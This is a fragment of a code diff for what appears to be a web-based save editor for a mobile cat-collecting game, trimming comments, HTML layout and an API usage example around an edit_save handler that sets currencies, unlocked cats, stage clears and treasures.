-    let response = requests.post(url, json=payload, timeout=45)
-    print("Response Status:", response.status_code)
-    print("Response Body:", response.text)</code></pre>
-  </section>
-
+    </div>
+  </div>
 </div>
-
 <script>
 function toggleTheme() {
   const html = document.documentElement;
@@ -1110,7 +594,6 @@ def edit_save():
     cc = str(data.get("confirmation_code") or data.get("cc") or data.get("confirmation_pin") or "").strip()
     country = str(data.get("country_code") or data.get("country") or data.get("cc_str") or "").strip()
 
-    # Currencies & items
     catfood = data.get("catfood")
     xp = data.get("xp")
     normal_tickets = data.get("normal_tickets")
@@ -1121,22 +604,18 @@ def edit_save():
     np = data.get("np")
     leadership = data.get("leadership")
 
-    # Cats
     unlock_cats = bool(data.get("unlock_cats", False))
     unlock_cat_ids = data.get("unlock_cat_ids")
     remove_cat_ids = data.get("remove_cat_ids")
 
-    # Stages
     clear_all_stages = bool(data.get("clear_all_stages", False))
     clear_chapters = data.get("clear_chapters")
     clear_stages = data.get("clear_stages")
 
-    # Treasures
     max_treasures = bool(data.get("max_treasures", False))
     max_chapter_treasures = data.get("max_chapter_treasures")
     stage_treasures = data.get("stage_treasures")
 
-    # Safety
     enable_safety = bool(data.get("enable_safety", False))
 
     if not validate_inputs(tc, cc) or not country:
@@ -1194,4 +673,3 @@ def edit_save():
         "confirmation_code": new_c,
         "details": res,
     })
-
